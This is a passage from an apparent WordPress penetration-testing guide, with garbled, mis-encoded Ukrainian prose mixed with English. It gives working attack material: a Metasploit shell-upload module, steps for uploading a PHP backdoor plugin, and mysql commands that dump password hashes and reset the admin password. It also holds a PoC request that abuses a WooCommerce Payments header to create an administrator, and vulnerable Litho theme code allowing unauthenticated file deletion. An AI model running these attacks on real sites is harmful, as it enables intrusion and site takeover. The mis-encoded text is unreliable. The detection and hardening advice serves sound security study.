–ü–æ—à—É–∫–∞–π—Ç–µ –≤ —ñ–Ω—Ç–µ—Ä–Ω–µ—Ç—ñ, —è–∫ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –æ–Ω–æ–≤–ª–µ–Ω–æ—ó —Å—Ç–æ—Ä—ñ–Ω–∫–∏. –£ —Ü—å–æ–º—É –≤–∏–ø–∞–¥–∫—É –ø–æ—Ç—Ä—ñ–±–Ω–æ –ø–µ—Ä–µ–π—Ç–∏ —Å—é–¥–∏: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

–ú–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
—â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ —Å–µ—Å—ñ—é.

## Plugin RCE

### PHP plugin

It may be possible to upload .php files as a plugin.\
–°—Ç–≤–æ—Ä—ñ—Ç—å —Å–≤—ñ–π php backdoor, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥:

![](<../../images/image (183).png>)

Then add a new plugin:

![](<../../images/image (722).png>)

Upload plugin and press Install Now:

![](<../../images/image (249).png>)

Click on Procced:

![](<../../images/image (70).png>)

Probably this won't do anything apparently, but if you go to Media, you will see your shell uploaded:

![](<../../images/image (462).png>)

Access it and you will see the URL to execute the reverse shell:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

This method involves the installation of a malicious plugin known to be vulnerable and can be exploited to obtain a web shell. This process is carried out through the WordPress dashboard as follows:

1. **Plugin Acquisition**: The plugin is obtained from a source like Exploit DB like [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- Navigate to the WordPress dashboard, then go to `Dashboard > Plugins > Upload Plugin`.
- Upload the zip file of the downloaded plugin.
3. **Plugin Activation**: Once the plugin is successfully installed, it must be activated through the dashboard.
4. **Exploitation**:
- With the plugin "reflex-gallery" installed and activated, it can be exploited as it is known to be vulnerable.
- The Metasploit framework provides an exploit for this vulnerability. By loading the appropriate module and executing specific commands, a meterpreter session can be established, granting unauthorized access to the site.
- It's noted that this is just one of the many methods to exploit a WordPress site.

–ö–æ–Ω—Ç–µ–Ω—Ç –≤–∫–ª—é—á–∞—î –≤—ñ–∑—É–∞–ª—å–Ω—ñ –ø—ñ–¥–∫–∞–∑–∫–∏, —â–æ —ñ–ª—é—Å—Ç—Ä—É—é—Ç—å –∫—Ä–æ–∫–∏ –≤ WordPress dashboard –¥–ª—è –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è —Ç–∞ –∞–∫—Ç–∏–≤–∞—Ü—ñ—ó –ø–ª–∞–≥—ñ–Ω–∞. –û–¥–Ω–∞–∫ –≤–∞–∂–ª–∏–≤–æ –∑–∞–∑–Ω–∞—á–∏—Ç–∏, —â–æ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π —Ç–∞–∫–∏–º —á–∏–Ω–æ–º —î –Ω–µ–∑–∞–∫–æ–Ω–Ω–æ—é —ñ –Ω–µ–µ—Ç–∏—á–Ω–æ—é –±–µ–∑ –Ω–∞–ª–µ–∂–Ω–æ—ó –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó. –¶—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é —Å–ª—ñ–¥ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞–ª—å–Ω–æ —ñ —Ç—ñ–ª—å–∫–∏ –≤ –ª–µ–≥–∞–ª—å–Ω–æ–º—É –∫–æ–Ω—Ç–µ–∫—Å—Ç—ñ, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥ –ø—ñ–¥ —á–∞—Å penetration testing –∑ —è–≤–Ω–∏–º –¥–æ–∑–≤–æ–ª–æ–º.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ is a script designed to escalate a **Cross-Site Scripting (XSS)** vulnerability to **Remote Code Execution (RCE)** or other's criticals vulnerabilities in WordPress. For more info check [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). –í—ñ–Ω –∑–∞–±–µ–∑–ø–µ—á—É—î –ø—ñ–¥—Ç—Ä–∏–º–∫—É –¥–ª—è Wordpress Versions 6.X.X, 5.X.X and 4.X.X —Ç–∞ –¥–æ–∑–≤–æ–ª—è—î:
- _**Privilege Escalation:**_ –°—Ç–≤–æ—Ä—é—î –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –≤ WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ –ó–∞–≤–∞–Ω—Ç–∞–∂—É—î –≤–ª–∞—Å–Ω–∏–π –ø–ª–∞–≥—ñ–Ω (backdoor) —É WordPress.
- _**(RCE) Built-In Plugin Edit:**_ –†–µ–¥–∞–≥—É—î –≤–±—É–¥–æ–≤–∞–Ω—ñ –ø–ª–∞–≥—ñ–Ω–∏ —É WordPress.
- _**(RCE) Built-In Theme Edit:**_ –†–µ–¥–∞–≥—É—î –≤–±—É–¥–æ–≤–∞–Ω—ñ —Ç–µ–º–∏ —É WordPress.
- _**(Custom) Custom Exploits:**_ –ï–∫—Å–ø–ª–æ–π—Ç–∏ –¥–ª—è —Å—Ç–æ—Ä–æ–Ω–Ω—ñ—Ö –ø–ª–∞–≥—ñ–Ω—ñ–≤/—Ç–µ–º WordPress.

## Post Exploitation

–û—Ç—Ä–∏–º–∞—Ç–∏ —ñ–º–µ–Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —Ç–∞ –ø–∞—Ä–æ–ª—ñ:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
–ó–º—ñ–Ω–∏—Ç–∏ –ø–∞—Ä–æ–ª—å –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### –ü–æ–≤–µ—Ä—Ö–Ω—è –∞—Ç–∞–∫–∏

–ó–Ω–∞–Ω–Ω—è —Ç–æ–≥–æ, —è–∫ –ø–ª–∞–≥—ñ–Ω Wordpress –º–æ–∂–µ –≤–∏—Å—Ç–∞–≤–ª—è—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—å, —î –∫–ª—é—á–æ–≤–∏–º –¥–ª—è –∑–Ω–∞—Ö–æ–¥–∂–µ–Ω–Ω—è –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç–µ–π —É –π–æ–≥–æ —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω–æ—Å—Ç—ñ. –í–∏ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏, —è–∫ –ø–ª–∞–≥—ñ–Ω –º–æ–∂–µ –≤–∏—Å—Ç–∞–≤–ª—è—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—å —É –Ω–∞—Å—Ç—É–ø–Ω–∏—Ö –ø—É–Ω–∫—Ç–∞—Ö —Ç–∞ –ø—Ä–∏–∫–ª–∞–¥–∏ –≤—Ä–∞–∑–ª–∏–≤–∏—Ö –ø–ª–∞–≥—ñ–Ω—ñ–≤ —É [**—Ü–µ–π –ø–æ—Å—Ç —É –±–ª–æ–∑—ñ**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

–û–¥–∏–Ω –∑—ñ —Å–ø–æ—Å–æ–±—ñ–≤, —è–∫–∏–º –ø–ª–∞–≥—ñ–Ω –º–æ–∂–µ –≤–∏—Å—Ç–∞–≤–ª—è—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—ó ‚Äî —á–µ—Ä–µ–∑ AJAX –æ–±—Ä–æ–±–Ω–∏–∫–∏. –¶—ñ –æ–±—Ä–æ–±–Ω–∏–∫–∏ –º–æ–∂—É—Ç—å –º—ñ—Å—Ç–∏—Ç–∏ –ø–æ–º–∏–ª–∫–∏ –≤ –ª–æ–≥—ñ—Ü—ñ, –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó –∞–±–æ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó. –ö—Ä—ñ–º —Ç–æ–≥–æ, –¥–æ—Å–∏—Ç—å —á–∞—Å—Ç–æ —Ü—ñ —Ñ—É–Ω–∫—Ü—ñ—ó –±—É–¥—É—Ç—å –±–∞–∑—É–≤–∞—Ç–∏ –π –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é, –π –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—é –Ω–∞ –Ω–∞—è–≤–Ω–æ—Å—Ç—ñ wordpress nonce, —è–∫–∏–π **–±—É–¥—å-—è–∫–∏–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –≤ –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ Wordpress –º–æ–∂–µ –º–∞—Ç–∏** (–Ω–µ–∑–∞–ª–µ–∂–Ω–æ –≤—ñ–¥ –π–æ–≥–æ —Ä–æ–ª—ñ).

–¶–µ —Ñ—É–Ω–∫—Ü—ñ—ó, —è–∫—ñ –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏—Å—å –¥–ª—è –≤–∏—Å—Ç–∞–≤–ª–µ–Ω–Ω—è —Ñ—É–Ω–∫—Ü—ñ—ó –≤ –ø–ª–∞–≥—ñ–Ω—ñ:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**–í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è `nopriv` —Ä–æ–±–∏—Ç—å –∫—ñ–Ω—Ü–µ–≤—É —Ç–æ—á–∫—É –¥–æ—Å—Ç—É–ø–Ω–æ—é –¥–ª—è –±—É–¥—å-—è–∫–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ (–Ω–∞–≤—ñ—Ç—å –Ω–µ–∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏—Ö).**

> [!CAUTION]
> –ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, —è–∫—â–æ —Ñ—É–Ω–∫—Ü—ñ—è –ª–∏—à–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—î –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—é –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ñ—É–Ω–∫—Ü—ñ—ó `wp_verify_nonce`, —Ü—è —Ñ—É–Ω–∫—Ü—ñ—è –ª–∏—à–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—î, —â–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∏–π, —ñ –∑–∞–∑–≤–∏—á–∞–π –Ω–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—î —Ä–æ–ª—å –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞. –¢–æ–º—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ –∑ –Ω–∏–∑—å–∫–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏ –º–æ–∂—É—Ç—å –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ –¥—ñ–π –∑ –≤–∏—Å–æ–∫–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏.

- **REST API**

–¢–∞–∫–æ–∂ –º–æ–∂–ª–∏–≤–æ –≤—ñ–¥–∫—Ä–∏—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —Ñ—É–Ω–∫—Ü—ñ–π wordpress, –∑–∞—Ä–µ—î—Å—Ç—Ä—É–≤–∞–≤—à–∏ REST API –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ñ—É–Ω–∫—Ü—ñ—ó `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` ‚Äî —Ü–µ callback-—Ñ—É–Ω–∫—Ü—ñ—è, —è–∫–∞ –ø–µ—Ä–µ–≤—ñ—Ä—è—î, —á–∏ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–∏–π –ø–µ–≤–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –¥–ª—è –≤–∏–∫–ª–∏–∫—É –º–µ—Ç–æ–¥—É API.

**–Ø–∫—â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≤–±—É–¥–æ–≤–∞–Ω–∞ —Ñ—É–Ω–∫—Ü—ñ—è `__return_true`, –≤–æ–Ω–∞ –ø—Ä–æ—Å—Ç–æ –ø—Ä–æ–ø—É—Å—Ç–∏—Ç—å –ø–µ—Ä–µ–≤—ñ—Ä–∫—É –ø—Ä–∞–≤ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.**

- **–ü—Ä—è–º–∏–π –¥–æ—Å—Ç—É–ø –¥–æ PHP-—Ñ–∞–π–ª—É**

–ó–≤—ñ—Å–Ω–æ, Wordpress –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î PHP —ñ —Ñ–∞–π–ª–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –ø–ª–∞–≥—ñ–Ω—ñ–≤ –¥–æ—Å—Ç—É–ø–Ω—ñ –Ω–∞–ø—Ä—è–º—É —á–µ—Ä–µ–∑ –≤–µ–±. –¢–æ–º—É —è–∫—â–æ –ø–ª–∞–≥—ñ–Ω –≤—ñ–¥–∫—Ä–∏–≤–∞—î —è–∫—É—Å—å –≤—Ä–∞–∑–ª–∏–≤—É —Ñ—É–Ω–∫—Ü—ñ–æ–Ω–∞–ª—å–Ω—ñ—Å—Ç—å, —è–∫–∞ —Å–ø—Ä–∞—Ü—å–æ–≤—É—î –ø—Ä–æ—Å—Ç–æ –ø—Ä–∏ –¥–æ—Å—Ç—É–ø—ñ –¥–æ —Ñ–∞–π–ª—É, –≤–æ–Ω–∞ –±—É–¥–µ –µ–∫—Å–ø–ª—É–∞—Ç–æ–≤–∞–Ω–∞ –±—É–¥—å-—è–∫–∏–º –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º.

### Trusted-header REST impersonation (WooCommerce Payments ‚â§ 5.6.1)

–î–µ—è–∫—ñ –ø–ª–∞–≥—ñ–Ω–∏ —Ä–µ–∞–ª—ñ–∑—É—é—Ç—å ¬´trusted header¬ª —Å–∫–æ—Ä–æ—á–µ–Ω–Ω—è –¥–ª—è –≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ—Ö —ñ–Ω—Ç–µ–≥—Ä–∞—Ü—ñ–π –∞–±–æ reverse proxies —ñ –ø–æ—Ç—ñ–º –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å —Ü–µ–π –∑–∞–≥–æ–ª–æ–≤–æ–∫ –¥–ª—è –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –∫–æ–Ω—Ç–µ–∫—Å—Ç—É –ø–æ—Ç–æ—á–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –¥–ª—è REST-–∑–∞–ø–∏—Ç—ñ–≤. –Ø–∫—â–æ –∑–∞–≥–æ–ª–æ–≤–æ–∫ –Ω–µ –∫—Ä–∏–ø—Ç–æ–≥—Ä–∞—Ñ—ñ—á–Ω–æ –ø–æ–≤'—è–∑–∞–Ω–∏–π —ñ–∑ –∑–∞–ø–∏—Ç–æ–º upstream-–∫–æ–º–ø–æ–Ω–µ–Ω—Ç–æ–º, –Ω–∞–ø–∞–¥–Ω–∏–∫ –º–æ–∂–µ spoof –π–æ–≥–æ —ñ –∑–≤–µ—Ä–Ω—É—Ç–∏—Å—è –¥–æ –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏—Ö REST-–º–∞—Ä—à—Ä—É—Ç—ñ–≤ —è–∫ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä.

- Impact: –Ω–µ–∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–µ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–æ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞ —à–ª—è—Ö–æ–º —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –Ω–æ–≤–æ–≥–æ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞ —á–µ—Ä–µ–∑ core users REST route.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (–ø—Ä–∏–º—É—à—É—î user ID 1, –∑–∞–∑–≤–∏—á–∞–π –ø–µ—Ä—à–∏–π –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞).
- Exploited route: `POST /wp-json/wp/v2/users` –∑ –º–∞—Å–∏–≤–æ–º —Ä–æ–ª–µ–π –∑ –ø—ñ–¥–≤–∏—â–µ–Ω–∏–º–∏ –ø—Ä–∞–≤–∞–º–∏.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
–ß–æ–º—É —Ü–µ –ø—Ä–∞—Ü—é—î

- –ü–ª–∞–≥—ñ–Ω –≤—ñ–¥–æ–±—Ä–∞–∂–∞—î –∑–∞–≥–æ–ª–æ–≤–æ–∫, –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–∏–π –∫–ª—ñ—î–Ω—Ç–æ–º, —É —Å—Ç–∞–Ω –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó —ñ –ø—Ä–æ–ø—É—Å–∫–∞—î –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –ø—Ä–∞–≤.
- –Ø–¥—Ä–æ WordPress –æ—á—ñ–∫—É—î –Ω–∞—è–≤–Ω—ñ—Å—Ç—å `create_users` capability –¥–ª—è —Ü—å–æ–≥–æ –º–∞—Ä—à—Ä—É—Ç—É; —Ö–∞–∫ –ø–ª–∞–≥—ñ–Ω—É –æ–±—Ö–æ–¥–∏—Ç—å —Ü–µ, –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –≤—Å—Ç–∞–Ω–æ–≤–ª—é—é—á–∏ –ø–æ—Ç–æ—á–Ω–∏–π –∫–æ–Ω—Ç–µ–∫—Å—Ç –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –∑ –∑–∞–≥–æ–ª–æ–≤–∫–∞.

–û—á—ñ–∫—É–≤–∞–Ω—ñ —ñ–Ω–¥–∏–∫–∞—Ç–æ—Ä–∏ —É—Å–ø—ñ—Ö—É

- HTTP 201 –∑ JSON-—Çi–ª–æ–º, —â–æ –æ–ø–∏—Å—É—î —Å—Ç–≤–æ—Ä–µ–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞.
- –ù–æ–≤–∏–π –∞–¥–º—ñ–Ω-–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á, –≤–∏–¥–∏–º–∏–π —É `wp-admin/users.php`.

–ö–æ–Ω—Ç—Ä–æ–ª—å–Ω–∏–π —Å–ø–∏—Å–æ–∫ –¥–ª—è –≤–∏—è–≤–ª–µ–Ω–Ω—è

- –®—É–∫–∞—Ç–∏ `getallheaders()`, `$_SERVER['HTTP_...']` –∞–±–æ vendor SDKs, —è–∫—ñ —á–∏—Ç–∞—é—Ç—å –∫–∞—Å—Ç–æ–º–Ω—ñ –∑–∞–≥–æ–ª–æ–≤–∫–∏ –¥–ª—è –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –∫–æ–Ω—Ç–µ–∫—Å—Ç—É –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `wp_set_current_user()`, `wp_set_auth_cookie()`).
- –ü–µ—Ä–µ–≥–ª—è–Ω—É—Ç–∏ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó REST –Ω–∞ –ø—Ä–µ–¥–º–µ—Ç –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏—Ö callback-—ñ–≤, —è–∫—ñ –ø–æ–∑–±–∞–≤–ª–µ–Ω—ñ –Ω–∞–¥—ñ–π–Ω–∏—Ö –ø–µ—Ä–µ–≤—ñ—Ä–æ–∫ `permission_callback` —ñ –Ω–∞—Ç–æ–º—ñ—Å—Ç—å –ø–æ–∫–ª–∞–¥–∞—é—Ç—å—Å—è –Ω–∞ –∑–∞–≥–æ–ª–æ–≤–∫–∏ –∑–∞–ø–∏—Ç—É.
- –®—É–∫–∞—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ñ—É–Ω–∫—Ü—ñ–π –∫–µ—Ä—É–≤–∞–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞–º–∏ —è–¥—Ä–∞ (`wp_insert_user`, `wp_create_user`) –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ REST-–æ–±—Ä–æ–±–Ω–∏–∫—ñ–≤, –¥–æ—Å—Ç—É–ø –¥–æ —è–∫–∏—Ö –æ–±–º–µ–∂–µ–Ω–∏–π –ª–∏—à–µ –∑–Ω–∞—á–µ–Ω–Ω—è–º–∏ –∑–∞–≥–æ–ª–æ–≤–∫—ñ–≤.

–ó–º—ñ—Ü–Ω–µ–Ω–Ω—è –±–µ–∑–ø–µ–∫–∏

- –ù—ñ–∫–æ–ª–∏ –Ω–µ –≤–∏–≤–æ–¥—å—Ç–µ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—é –∞–±–æ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—é –∑ –∑–∞–≥–æ–ª–æ–≤–∫—ñ–≤, –∫–æ–Ω—Ç—Ä–æ–ª—å–æ–≤–∞–Ω–∏—Ö –∫–ª—ñ—î–Ω—Ç–æ–º.
- –Ø–∫—â–æ reverse proxy –º–∞—î —ñ–Ω–∂–µ–∫—Ç–∏—Ç–∏ —ñ–¥–µ–Ω—Ç–∏—á–Ω—ñ—Å—Ç—å, –∑–∞–≤–µ—Ä—à—ñ—Ç—å –¥–æ–≤—ñ—Ä—É –Ω–∞ –ø—Ä–æ–∫—Å—ñ —ñ –≤–∏–¥–∞–ª—è–π—Ç–µ –≤—Ö—ñ–¥–Ω—ñ –∫–æ–ø—ñ—ó (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, `unset X-Wcpay-Platform-Checkout-User` –Ω–∞ –∫—Ä–∞—é), –ø–æ—Ç—ñ–º –ø–µ—Ä–µ–¥–∞–≤–∞–π—Ç–µ –ø—ñ–¥–ø–∏—Å–∞–Ω–∏–π —Ç–æ–∫–µ–Ω —ñ –ø–µ—Ä–µ–≤—ñ—Ä—è–π—Ç–µ –π–æ–≥–æ –Ω–∞ —Å–µ—Ä–≤–µ—Ä—ñ.
- –î–ª—è REST-–º–∞—Ä—à—Ä—É—Ç—ñ–≤, —â–æ –≤–∏–∫–æ–Ω—É—é—Ç—å –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω—ñ –¥—ñ—ó, –≤–∏–º–∞–≥–∞–π—Ç–µ –ø–µ—Ä–µ–≤—ñ—Ä–æ–∫ `current_user_can()` —Ç–∞ –∂–æ—Ä—Å—Ç–∫–æ–≥–æ `permission_callback` (–Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ `__return_true`).
- –í—ñ–¥–¥–∞–≤–∞–π—Ç–µ –ø–µ—Ä–µ–≤–∞–≥—É –ø–µ—Ä—à–æ–ø–∞—Ä—Ç—ñ–π–Ω—ñ–π –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó (cookies, application passwords, OAuth) –∑–∞–º—ñ—Å—Ç—å ¬´—ñ–º—ñ—Ç–∞—Ü—ñ—ó¬ª —á–µ—Ä–µ–∑ –∑–∞–≥–æ–ª–æ–≤–∫–∏.

–ü–æ—Å–∏–ª–∞–Ω–Ω—è: –¥–∏–≤. –ø–æ—Å–∏–ª–∞–Ω–Ω—è –≤ –∫—ñ–Ω—Ü—ñ —Ü—ñ—î—ó —Å—Ç–æ—Ä—ñ–Ω–∫–∏ –¥–ª—è –ø—É–±–ª—ñ—á–Ω–æ–≥–æ –≤–∏–ø–∞–¥–∫—É —Ç–∞ —à–∏—Ä—à–æ–≥–æ –∞–Ω–∞–ª—ñ–∑—É.

### –ù–µ–∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–µ –¥–æ–≤—ñ–ª—å–Ω–µ –≤–∏–¥–∞–ª–µ–Ω–Ω—è —Ñ–∞–π–ª—ñ–≤ —á–µ—Ä–µ–∑ wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress themes and plugins frequently expose AJAX handlers through the `wp_ajax_` and `wp_ajax_nopriv_` hooks.  When the **_nopriv_** variant is used **the callback becomes reachable by unauthenticated visitors**, so any sensitive action must additionally implement:

1. A **capability check** (e.g. `current_user_can()` or at least `is_user_logged_in()`), and
2. A **CSRF nonce** validated with `check_ajax_referer()` / `wp_verify_nonce()`, and
3. **Strict input sanitisation / validation**.

The Litho multipurpose theme (< 3.1) forgot those 3 controls in the *Remove Font Family* feature and ended up shipping the following code (simplified):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
–ü—Ä–æ–±–ª–µ–º–∏, —è–∫—ñ –≤–∏–∫–ª–∏–∫–∞—î —Ü–µ–π —Ñ—Ä–∞–≥–º–µ–Ω—Ç:

* **–î–æ—Å—Ç—É–ø –±–µ–∑ –∞–≤—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó** ‚Äì the `wp_ajax_nopriv_` hook is registered.
* **–í—ñ–¥—Å—É—Ç–Ω—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ nonce / capability** ‚Äì –±—É–¥—å-—è–∫–∏–π –≤—ñ–¥–≤—ñ–¥—É–≤–∞—á –º–æ–∂–µ –∑–≤–µ—Ä–Ω—É—Ç–∏—Å—è –¥–æ endpoint.
* **–í—ñ–¥—Å—É—Ç–Ω—è —Å–∞–Ω—ñ—Ç–∏–∑–∞—Ü—ñ—è —à–ª—è—Ö—É** ‚Äì —Ä—è–¥–æ–∫ `fontfamily`, —â–æ –∫–æ–Ω—Ç—Ä–æ–ª—é—î—Ç—å—Å—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º, –∫–æ–Ω–∫–∞—Ç–µ–Ω—É—î—Ç—å—Å—è –∑ —Ñ–∞–π–ª–æ–≤–∏–º —à–ª—è—Ö–æ–º –±–µ–∑ —Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó, —â–æ –¥–æ–∑–≤–æ–ª—è—î –∫–ª–∞—Å–∏—á–Ω–∏–π `../../` traversal.

#### –ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è

